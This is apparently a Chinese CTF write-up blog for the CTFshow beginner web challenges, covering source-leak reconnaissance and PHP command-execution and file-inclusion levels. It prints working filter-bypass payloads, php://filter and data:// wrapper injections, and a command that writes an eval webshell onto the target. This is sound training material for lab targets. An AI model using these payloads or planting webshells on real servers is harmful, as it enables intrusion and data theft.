---
title: CTFshow Web 入门题解：信息搜集、PHP 特性与漏洞利用
description: 整理 CTFshow Web 入门做题过程，记录信息搜集、命令执行、文件包含、PHP 特性、反序列化、代码审计、XSS、JWT、SSRF 与 SSTI 等题目的思路和代码。
date: 2025-03-19
published: 2025-03-31
updated: 2025-03-31
categories:
  - 技术
  - 网络安全
tags:
  - CTF
  - CTFshow
  - Web 安全
  - PHP
  - 反序列化
  - SSRF
  - SSTI
type: story
image: /article-assets/2025/ctfshow-web-notes/images/cover.webp
---

::quote
#icon
[CTFshow]{style="color: var(--c-primary)"}
#default
Web 入门 · 解题思路 · 代码记录
::

## web入门--信息搜索题解
### 搜索思路
1.查看源码

2.view-source

3.burpsuite抓包

4.访问robots.txt

5.访问index.phps

6.访问 /www.zip

7.访问 <strong>url/.git/index.php</strong> 或 <strong>url/.git</strong> 获取源码

8. /.svn/

9.访问 url/index.php.swp

10.谷歌的检查（开发者工具）中在 Application 模块中查看 cookie。

BurpSuite 直接抓包，在请求数据包看到 flag。

11.dns 检查查询：[http://dbcha.com/](http://dbcha.com/)，输入域名，获取 flag。

12.查找网页上是否有可能是密码的信息

13.根据提示直接在 url 后面添加 /editor，或者在源码里发现信息。

14.探针路径，可以在url后加上 /tz.php

15.根据提示，直接 url + backup.sql 。

16.mdb文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱库了。

url + /db/db.mdb

### web1
查看网页源码即可。

查看网页源码：ctrl + u 或 F12

<strong>开发注释未及时删除</strong>

### web2
依旧可以通过 ctrl + u 查看网页源码  
也可以在通过在url头部添加 view-source: 来查看源码

<strong>js前台拦截约等于无效操作</strong>

<strong>题解</strong>

依旧是查看源码。

查看网页源码后可看到：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-001.webp)

<strong>oncontextmenu</strong> 事件：在元素中用户右击鼠标时触发并打开上下文菜单。

<strong>onselectstart</strong> 事件：触发时间为目标对象被开始选中时（即选中动作刚开始，尚未实质性被选中）。

<strong>onkeydown</strong> 事件：在用户按下一个按键时执行 Javascript 代码

keyCode表示键盘编码，编码 123 为 F12。

### web3
通过 burpsuite 抓包，flag 在返回的响应数据包里面。

<strong>题解</strong>


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-002.webp)

### web4
<strong>“后台地址泄露” 总有人把后台地址写入robots</strong>

<strong>robots 协议也称爬虫协议、爬虫规则等，是指网站可建立一个 robots.txt 文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取 robots.txt 文件来识别这个页面是否允许被抓取。但是，这个 robots 协议不是防火墙，也没有强制执行力，搜索引擎完全可以忽视 robots.txt 文件去抓取网页的快照。      
Robots 协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。  </strong>

<strong>题解</strong>

考点是 robots.txt 文件，直接访问 url/robots.txt 获得 flag


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-003.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-004.webp)

### web5
<strong>phps 源码泄露有时候能帮上忙</strong>

考点 phps 文件泄露，直接访问 index.phps。获得 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-005.webp)

<strong>原理</strong>

phps 文件是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。

### web6
<strong>解压源码到当前目录，测试正常，收工</strong>

<strong>题解</strong>

存在源码的压缩包没有删除，访问 /www.zip。知道了 flag 所在的文件和路径，直接访问 /fl000g.txt

访问 www.zip 拿到源码


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-006.webp)

解压后拿到两个文件。直接查看 txt 文件，并非正确 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-007.webp)

访问 fl000g.txt 拿到 flag


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-008.webp)

<strong>题解</strong>

源码泄露。

网站管理员一般会将网站源码进行备份，以便于出问题后恢复网站。但备份时，安全意识薄弱的管理员经常会使用一些常见的压缩备份名，如文件夹的名字 www.zip、 web.rar，或者 backup.rar 等，有的甚至就直接把备份好的源码放了在网站根目录里。

常见备份后缀名： .rar、.zip、.7z、.tar.gz、.bak、.txt、.old、.temp。

### web7
提示：版本控制很重要，但不要部署到生产环境更重要。

git 泄露：关于版本控制，首先想到的是 git 泄露。访问 /.git，获取源码。

<strong>题解</strong>

访问 <strong>url/.git/index.php</strong> 或 <strong>url/.git</strong> 获取源码


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-009.webp)

### web8
提示：版本控制很重要，但不要部署到生产环境更重要。

svn 泄露：访问 /.svn， 得到 flag

<strong>题解</strong>

考察信息 svn 泄露,直接访问 url/.svn/


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-010.webp)

### web9
<strong>题解</strong>

提示：发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了。

获得下载的源码后打开即可获得 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-011.webp)

[CTFHUBWeb技能树-信息泄露writeup](https://blog.csdn.net/a597934448/article/details/105431367)

<strong>原理</strong>

<strong>vim 缓存信息泄露</strong>，直接访问 url/index.php.swp

vim 在编辑文本时就会创建临时缓存文件，用来备份缓冲区中的内容。当程序异常退出时会被保留下来，因此可以通过该缓存文件恢复原始文件内容。  
[VIM不正常退出产生的swp文件](https://blog.csdn.net/Pwiling/article/details/51830781)

### web10
cookie 只是一块饼干，不能存放任何隐私数据

[cookie和session的详解与区别](https://www.cnblogs.com/l199616j/p/11195667.html)

<strong>题解</strong>

<strong>解法一</strong>：  
谷歌的检查（开发者工具）中在 Application 模块中查看 cookie。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-012.webp)

<strong>解法二</strong>：  
BurpSuite 直接抓包，在请求数据包看到 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-013.webp)

注意：信息经过了 url 编码

### web11
<strong>题解</strong>

提示：域名其实也可以隐藏信息，比如 flag.ctfshow.com 就隐藏了一条信息


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-014.webp)

<strong>原理</strong>

dns 检查查询：[http://dbcha.com/](http://dbcha.com/)，输入域名，获取 flag。  
（TXT 记录，一般指为某个主机名或域名设置的说明。）

### web12
robots.txt 信息泄露。

<strong>题解</strong>

提示：有时候网站上的公开信息，就是管理员常用密码

查看 robots.txt 文件，发现后台登录页面 /admin


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-015.webp)

管理用户名一般为 admin 等默认名。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-016.webp)

查找网页上是否有可能是密码的信息，发现页面下方有串数字，尝试成功。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-017.webp)

### web13
技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码。

<strong>题解</strong>

根据题目提示 “ 技术文档 ” 在页面下面发现 document，下载发现里面存在后台地址和用户名密码。登录成功获得 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-018.webp)

下载发现里面存在后台地址和用户名密码。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-019.webp)

登录成功获得 flag


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-020.webp)

### web14
有时候源码里面就能不经意间泄露重要的信息。

<strong>题解</strong>

提示： 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录  
有时候源码里面就能不经意间泄露重要（editor）的信息，默认配置害死人

可以根据提示直接在 url 后面添加 /editor，或者在源码里发现信息。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-021.webp)

发现一个编辑页面。点击上传文件。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-022.webp)

发现 “ 文件空间 ”


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-023.webp)

在 /var/www/html/nothinghere/fl000g.txt 发现 flag 文件，访问 url+/nothinghere/fl000g.txt


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-024.webp)

### web15
公开的信息比如邮箱，可能造成信息泄露，产生严重后果

<strong>题解</strong>

尝试访问 /admin 后台页面。发现有一个忘记密码操作。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-025.webp)

需要输入地址。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-026.webp)

在主页面下面看到 QQ 邮箱。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-027.webp)

通过QQ号查询邮箱，发现地址是西安。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-028.webp)

成功重置密码，用户名 admin 登录成功获得 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-029.webp)

### web16
<strong>题解</strong>

探针路径，可以在url后加上 /tz.php。（雅黑 php 探针）


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-030.webp)

查看 phpinfo 页面。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-031.webp)

查找 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-032.webp)

<strong>原理</strong>

PHP 探针：  
php 探针是用来探测空间、服务器运行状况和 PHP 信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息

雅黑 PHP 探针：url 后缀名添加 /tz.php。  
upupw PHP 探针：url 后缀名添加 /u.php。

其他探针：MyProber PHP 探针、9gan PHP 探针、浪点 PHP 探针等。

对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露

### web17
备份的 sql 文件会泄露敏感信息。

<strong>题解</strong>

根据提示，直接 url + backup.sql 。  
在下载的文件中找到 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-033.webp)

### web18
<strong>题解</strong>

查看源码，查看 js 文件，分析获取 flag 的条件。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-034.webp)

查看 js 代码可以看到，当分数超过 100 时，会有一个弹窗。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-035.webp)

复制一下信息，在控制台输入，获取到信息提示：110.php


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-036.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-037.webp)

<strong>原理</strong>

[浏览器控制台的使用](https://blog.csdn.net/qq_36171287/article/details/117457730)。

windows.confirm() 方法用于显示一个带有指定消息和确认及取消按钮的对话框。  
如果访问者点击 " 确定 "，此方法返回 true，否则返回 false。

### web19
前端信息泄露与简单的前端加密。

<strong>题解</strong>

提示：密钥什么的，就不要放在前端了。

用户名登录界面。查看源码，发现用户名和密码。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-038.webp)

这里不能直接在登录界面输入，因为源码中发现在前端点击按钮后，会对密码进行加密。

可以用 burp 抓包修改，或者使用 harkbar 插件，post 传递。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-039.webp)

### web20
asp + access 数据库。

<strong>题解</strong>

mdb文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱库了。

url + /db/db.mdb


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-040.webp)

下载文件通过 txt 打开搜索 flag。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-041.webp)

## web入门--命令执行题解
### 提要
部分php函数：

一、命令执行函数（能够执行操作系统命令行指令的函数）

        1、system()：在 PHP 中，system() 函数用于执行一个外部程序，并且可以显示输出结果。这个函数会返回最后一行的输出，或者在没有输出时返回 null。

        2、passthru()：在 PHP 中，passthru() 函数用于执行一个外部程序，并且可以显示命令的原始输出。

        3、其他（没有回显的命令执行函数，需要echo输出）


二、代码执行函数（能够执行代码片段的函数）

        eval()：在 PHP 中，eval() 函数是一个语言结构，用于执行字符串作为 PHP 代码。eval要以分号结尾，传入的参数必需为php代码


三、正则表达式匹配函数

        preg_match()：PHP 中用于执行正则表达式匹配的函数。它检查给定的字符串是否符合特定的模式（正则表达式）(可添加修饰符i，表示不区分大小写)，如果匹配成功，返回 1；如果匹配失败，则返回 0。如：preg_match("/flag/i",\$c)，如果变量\$c中含flag（不论大小写），则返回1

#### 用到的Linux命令
1、ls：列出当前路径下的文件及文件夹

2、cat：从第一行向下显示文件内容

3、tac：与cat相反，从最后一行向上显示文件内容


绕过方式：

一、空格绕过

%20 --代表url编码的空格，在空格过滤时可以代替。

%09--用于在输出或显示文本时在该位置产生一个固定的水平间距，类似于tab键。

%0a--代表换行符

%0b--用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。

%0d--回车换行

%a0--代表的是非断行空格

%00--%00代表的是ASCII码中的空字符


二、通配符绕过

通配符*：用于匹配文件名或路径中的任意字符序列，可以匹配任意数量的字符，包括零个字符。它通常在命令行和文件操作中使用，以指定多个文件或目录。


三、直接执行系统命令

命令执行函数并没有被过滤，可以尝试直接执行系统命令


四、内敛执行

将``` `` ```或\$()内命令的输出作为输入执行，在php中，反引号作用和system类似，这种语法类似于在 shell 中执行命令。


如：echo `ls`,列出目录内容


五、利用参数逃逸

        1、eval()：“?c=eval(\$_GET[1]);&1=system('nl flag.php')”：将“system('nl flag.php')”传递给\$_GET[1]，作为eval()的参数执行

        2、include()：


                a、php://filter:利用PHP 的 include 函数和 php://filter 流包装器来实现任意文件读取和内容编码。如：“?c=include\$_GET[1]&1=php://filter/read=convert.base64-encode/resource=flag.php”：这里使用 php://filter 流包装器读取 flag.php 文件的内容，并使用 convert.base64-encode 过滤器对内容进行 Base64 编码。这样，flag.php 的内容被编码为 Base64 字符串，并通过 include 函数包含进来，从而可以绕过某些对直接文件内容执行的限制。


                b、data://：利用PHP 的include 函数和 data:// 协议来执行一个包含 PHP 代码的字符串。如：“?c=include\$_GET[1];&1=data://text/plain,`<?php system('tac flag.php');?>`”：data:// 协议允许在 URL 中直接嵌入数据，这里嵌入的是一段 PHP 代码。这段代码通过 system 函数执行了一个命令，该命令试图读取flag.php的文件的内容


### web29

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c))//说明flag被过滤，需使用通配符* 模糊查询
    {
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```


?c=system("ls");

查询列表内容

+ <strong>快速查看文件内容</strong>：`cat`、`less`、`more`
+ <strong>查找特定内容</strong>：`grep`、`awk`、`sed`
+ <strong>高级操作</strong>：`strings`、`xxd`
+ <strong>目录级搜索</strong>：`find`、`grep -r`、`ag`

<strong>法一：搜索内容</strong>

?c=system('tac f*');

或 ?c=system('tail -n 10 f*');

<strong>法二：蚁剑</strong>

在URL中向服务器写入木马

?c=system('echo \'<strong>`<?php @eval($_REQUEST["cmd"]); ?>`</strong>\' > eval.php');

或?c=system('echo \'<strong>`<?php @eval($_POST["cmd"]); ?>`</strong>\' > eval.php');

而\$_GET不行


<details>
<summary>代码解释</summary>

1. `?c=system(...)`

- 这是一个 URL 查询参数，`c` 参数的值是 `system()` 函数的调用。`system()` 是 PHP 中的一个函数，用于执行操作系统命令，并返回命令的输出。
- 在这里，`system()` 函数的作用是执行一个 `echo` 命令，它将在服务器上创建一个文件 `eval.php`。

2. `echo '<?php @eval($_REQUEST["cmd"]); ?>'`

- `echo` 是 PHP 中的一个输出函数，它会输出指定的内容到文件或终端。
- `$_REQUEST` 是 PHP 中的一个超级全局变量，它可以访问<strong>GET</strong>、<strong>POST</strong> 和 <strong>COOKIE</strong>中的所有数据。
- 在这个命令中，`echo` 会输出一个 PHP WebShell 脚本：

```plain
<?php @eval($_REQUEST["cmd"]); ?>
```



- `@eval($_REQUEST["cmd"])`：`eval()` 函数执行传入的 PHP 代码字符串。`$_REQUEST["cmd"]` 代表从 HTTP 请求中传递的 `cmd` 参数，`eval()` 将该参数当做 PHP 代码执行。
- `@` 是 PHP 的错误抑制符，它会防止任何可能发生的错误显示出来，攻击者利用这一点来避免错误信息暴露给用户，进而隐藏攻击行为。

3. `> eval.php`

- `>` 是 Shell 中的输出重定向符号，表示将 `echo` 输出的内容写入到指定文件中。
- 这里，`eval.php` 是目标文件的名称，也就是说，`<?php @eval($_REQUEST["cmd"]); ?>` 这一段 PHP 代码将被写入 `eval.php` 文件中。

#### <strong>总结：</strong>

这条命令会在目标服务器的当前工作目录下创建一个 `eval.php` 文件，文件内容如下：

```plain
php


复制编辑
<?php @eval($_REQUEST["cmd"]); ?>
```


#### <strong>这段代码的功能：</strong>

- <strong>WebShell</strong>：`eval.php` 文件中包含一个非常简单的 WebShell，攻击者可以通过该文件执行任意 PHP 代码。只要向该文件发送 `cmd` 参数，`eval()` 函数就会执行传递的代码。

- 例如：`eval.php?cmd=system('ls')`，将会执行 `ls` 命令并返回输出结果。

#### <strong>潜在的安全风险：</strong>

1. <strong>远程代码执行（RCE）</strong>：由于攻击者可以通过 `cmd` 参数执行任意的系统命令或 PHP 代码，这使得 `eval.php` 具有极大的安全风险。
2. <strong>命令注入</strong>：如果 `cmd` 参数没有经过适当的验证和过滤，攻击者可以执行操作系统命令（如 `cat /etc/passwd`，`rm -rf /` 等）。
3. <strong>绕过错误显示</strong>：`@eval` 用于抑制错误，这使得攻击者的恶意操作不容易被检测到。

</details>


使用蚁剑的url码输入[<strong>http</strong>://f53f7031-aa10-48b8-bfcb-44f4f548cee1.challenge.ctf.show/](https://f53f7031-aa10-48b8-bfcb-44f4f548cee1.challenge.ctf.show/)eval.php

要注意是http而不是https

密码则为<strong>cmd</strong>

<strong>法三：复制文件</strong>

将fla?.php复制并创建一个新的文件名，最后直接打开该文件即可

?c=system('cp fla?.php 1.txt');

/1.txt即可

### web30

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c))//可知system与flag被过滤
    {
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



<details>
<summary>system()和passthru()区别</summary>

#### 1. <strong>返回值</strong>

- `system()`：

- `system()` 函数执行命令并返回输出的最前面一行内容。
- 它的返回值是命令的最后一行输出内容。即它不仅执行命令，还将命令的输出返回给调用者。
- `system()` 还可以通过一个参数返回执行命令的状态码。
- 语法：

```plain
php

复制编辑
string system(string $command, int &$return_var = null)
```


`&$return_var` 是一个可选的引用参数，用于存储命令执行后的返回值（退出状态码）。

- `passthru()`：

- `passthru()` 用于执行外部命令并将所有的输出直接传递到标准输出（通常是浏览器或终端）。
- 它不会返回命令的输出，而是直接将输出显示给用户，因此它不关心输出的内容。
- `passthru()` 通常用于那些需要将输出发送给浏览器的场景（例如执行图片或其他文件转换）。
- 它的返回值是命令的退出状态码。
- 语法：

```plain
php

复制编辑
void passthru(string $command, int &$return_var = null)
```


#### 2. <strong>输出行为</strong>

- `system()`：将命令的输出内容（仅一行）返回给调用者。适合用来获取输出并进行处理。
- `passthru()`：直接将命令的所有输出发送到浏览器或标准输出，不返回输出内容。适合用来执行生成二进制文件或流式输出的命令。

#### 3. <strong>应用场景</strong>

- `system()`：常用于当你需要处理命令输出并进行后续操作时，尤其适用于处理文本输出的情况。
- `passthru()`：常用于执行那些需要直接输出内容的命令，尤其是在执行二进制程序时（如生成图片、视频或其他格式的文件）。

</details>


按照web29，将system()改为passthru()

法三：

/?c='cp fla?.??? 1.txt';    ----因为php被过滤，且?代表单个字符，而*代表多个

/1.txt

### web31

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```


此题较上一题多过滤了"cat sort shell"以及，<strong>点，空格，单引号</strong>这些字符串。  
<strong>方法一：</strong>  
可以尝试通过嵌套eval函数来获取另一个参数的的方法来绕过，因为这里只判断了c这个参数，并不会判断其他参数的传入


```php
?c=eval($_GET[a]);&a=system('cat flag.php');

这里注意后面是a的参数，而不是c的参数，这个payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数
```



<details>
<summary>拓展</summary>

嵌套写木马

?c=eval(\$_GET`[1]`);&1=system('echo \'`<?php @eval($_POST["cmd"]); ?>`\' > eval.php');

再用蚁剑（连接时注意用http）

</details>


<strong>方法二：</strong>

<strong>?c=<span style="color: #DF2A3F">passthru</span>("ls");</strong>既然过滤 ' 那就用 "

<strong>?c=passthru("tac%09f*");</strong>--用%09替代空格

### 伪协议
在ctf中常用的有<strong>data://</strong> , <strong>php://input</strong> , <strong>php://filter</strong> ，<strong>file://</strong>

<span style="color: #DF2A3F">php://input ，data://用来执行命令</span>

<strong>在include() / require() / include_once() / require_once() 参数可控的情况下，即使导入非.php文件，如shell.txt ，依然按照php语法进行解析，这是include()函数所决定的</strong>


data://text/plain 任意代码执行

可以使用data://数据流封装器，以传递相应格式的数据。通常用来执行php代码

<strong>?变量=data://text/plain,`<?php phpinfo();?>`</strong>


php://input 任意代码执行;这种伪协议用于读取原始的 HTTP POST 数据，可以用于处理上传的文件和表单数据。

变量=php://input，然后同时post想运行的语句

<strong>?file=php://input,`[POST DATA部分]``<?php phpinfo(); ?>`</strong>


php://filter 读取文件源码 （协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码）

变量=php://filter/convert.base64/resource=文件名

<strong>?file=php://filter/read=convert.base64-encode/resource=flag.php</strong>（读取php文件需要先加密以下才能读出来，并且拿到的源码需要进行base64解码下）


file://可在双off情况下使用，用于<strong>访问本地文件</strong>系统，在ctf中通常用来读取本地文件

变量=file://文件地址（绝对地址）

<strong>?变量=file://E:\phpStudy\PHPTutorial\WWW\flag.txt</strong>


<strong>zip:// </strong>、<strong>bzip:// </strong>、<strong>zlib://</strong> 均属于压缩流，可以<strong>访问压缩文件中的子文件</strong>，更重要的是不需要指定后缀名，<strong>可以修改为任意后缀名</strong>，如 jpg，png，gif，xxx等

zip:// 配合文件上传开启后门

<strong>zip://`[压缩文件绝对路径]`%23`[压缩文件内的子文件文件名]`</strong>(# 的编码为 %23)

eg：

?变量=zip://D:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt

`phpinfo.jpg` 是一个压缩文件，里面包含 `phpinfo.txt`，通过 `zip://` 协议读取的就是 `phpinfo.txt` 文件。  


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-042.webp)

### *web32

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```


该题过滤内容增加

方法一：（文件包含方法）

<strong>?c=<span style="color: #DF2A3F">include</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

再使用hackbar中的encoding的base64 decode模式解开base64编码即可

### web33

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```


该题过滤内容增加"

方法一：（文件包含方法）<span style="color: #DF2A3F">或者用data://text/plain</span>

<strong>?c=<span style="color: #DF2A3F">include</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

再使用hackbar中的encoding的base64 decode模式解开base64编码即可

方法二：

<strong>?c=<span style="color: #DF2A3F">require</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

方法三：

<strong>?c=include\$_GET`[a]`?>&a=data://text/plain,<?=passthru('tac flag.php')?></strong>

### *web34

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```


该题过滤内容增加  :  -->过滤了直接使用伪协议，所以直能嵌套来逃逸变量

方法一：（文件包含方法）<span style="color: #DF2A3F">或者用data://text/plain</span>

<strong>?c=<span style="color: #DF2A3F">include</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

再使用hackbar中的encoding的base64 decode模式解开base64编码即可

方法二：

<strong>?c=<span style="color: #DF2A3F">require</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

<strong>（不是用括号的语言结构包括 echo(x) print isset(x) unset include require...）</strong>

### web35
该题过滤内容增加  <  =

方法一：（文件包含方法）<span style="color: #DF2A3F">或者用data://text/plain</span>

<strong>?c=<span style="color: #DF2A3F">include</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

再使用hackbar中的encoding的base64 decode模式解开base64编码即可

方法二：

<strong>?c=<span style="color: #DF2A3F">require</span>%0a\$_GET`[1]`?>&1=php://filter/convert.base64-encode/resource=flag.php</strong>

### web36
该题过滤内容增加  /  和数字`[0-9]`

方法一：（文件包含方法）<span style="color: #DF2A3F">或者用data://text/plain</span>

<strong>?c=<span style="color: #DF2A3F">include</span><mark style="background-color: #FBDE28; color: #222">%0a</mark>\$_GET`[a]`?>&a=php://filter/convert.base64-encode/resource=flag.php</strong>

再使用hackbar中的encoding的base64 decode模式解开base64编码即可

方法二：

<strong>?c=<span style="color: #DF2A3F">require</span>%0a\$_GET`[a]`?>&a=php://filter/convert.base64-encode/resource=flag.php</strong>

### web37

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```


该题改为include执行而非前面的eval  过滤内容为flag

方法一：（文件包含 用data伪协议）

<strong>?c=data://text/plain,`<?php system('tac fla*');?>`</strong>

?c=data://text/plain,后面内容默认以php代码执行

### web38
在上题的基础上增加了过滤内容为 php  file

方法一：

<strong>?c=data://text/plain,<?=system('tac fl*');?></strong>

### web39

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
      }
        
}else{
    highlight_file(__FILE__);
}
```


可知此题无回显且被强制加后缀  .php

<strong>?c=data://text/plain,<?=phpinfo;?></strong> 可知phpinfo()返回1 因此输出1.php

此题答案为

<strong>?c=data://text/plain,`<?php system('tac f*');?>`</strong>


### 无参数函数补充
eg:


```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```


分析该正则：<strong>/`[^\W]`+\((?R)?\)/</strong>

+ `[^\W]+`：匹配<strong>变量名或函数名</strong>，相当于 `\w+`（如 `a`, `b`, `func123`）。
+ `\(` 和 `\)`：匹配<strong>括号</strong>，表示函数调用（如 `func()`）。
+ `(?R)?`：<strong>递归匹配自身</strong>，表示括号内可以再有函数调用（如 `a(b(c()))`）。

<strong>示例</strong>

| 正则表达式 | 匹配内容 |
| :---: | :---: |
| `\w` | <strong>一个</strong>单词字符（如 `a`, `1`, `_`） |
| `\w+` | <strong>一个或多个</strong>单词字符（如 `abc`, `word123`） |
| `\w*` | <strong>零个或多个</strong>单词字符（如 `""`, `hello`, `test_99`） |


<strong>总结</strong>  
该正则校验仅能通过 a(b(c())); 类型

#### 基础函数学习
目录操作：

getchwd() ：函数返回当前工作目录。

scandir() ：函数返回指定目录中的文件和目录的数组。

dirname() ：函数返回路径中的目录部分。

chdir() ：函数改变当前的目录。


显示目录下内容：

var_dump()：打印变量的相关信息

var_export()：输出或返回变量的可解析字符串表示。

print_r(scandir('/'));

var_dump(scandir('/'));

var_export(scandir('/'));


数组相关的操作：

end() - 将内部指针指向数组中的最后一个元素，并输出。

next() - 将内部指针指向数组中的下一个元素，并输出。

prev() - 将内部指针指向数组中的上一个元素，并输出。

reset() - 将内部指针指向数组中的第一个元素，并输出。

each() - 返回当前元素的键名和键值，并将内部指针向前移动。

array_shift() - 删除数组中第一个元素，并返回被删除元素的值。


读文件:

show_source() - 对文件进行语法高亮显示。

readfile() - 输出一个文件。

highlight_file() - 对文件进行语法高亮显示。

file_get_contents() - 把整个文件读入一个字符串中。

fgets()

fgets()函数使用：


```php
c=
$a=fopen("flag.php","r");
while($b=fgets($a)){
echo $b;
}
```


file()

readfile()

readgzfile() - 可用于读取非 gzip 格式的文件

print_r(det_defined_vars());  打印所有可用的变量


文件读取查看当前目录文件名

print_r(scandir(current(localeconv())));


当前目录倒数第一位文件：

show_source(end(scandir(getcwd())));


当前目录倒数第二位文件：

show_source(next(array_reverse(scandir(getcwd()))));


随机返回当前目录文件：

highlight_file(array_rand(array_flip(scandir(getcwd()))));

show_source(array_rand(array_flip(scandir(getcwd()))));

show_source(array_rand(array_flip(scandir(current(localeconv())))));


查看上一级目录文件名

print_r( );

print_r(scandir(next(scandir(getcwd()))));

print_r(scandir(next(scandir(getcwd()))));


读取上级目录文件

show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));


● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。

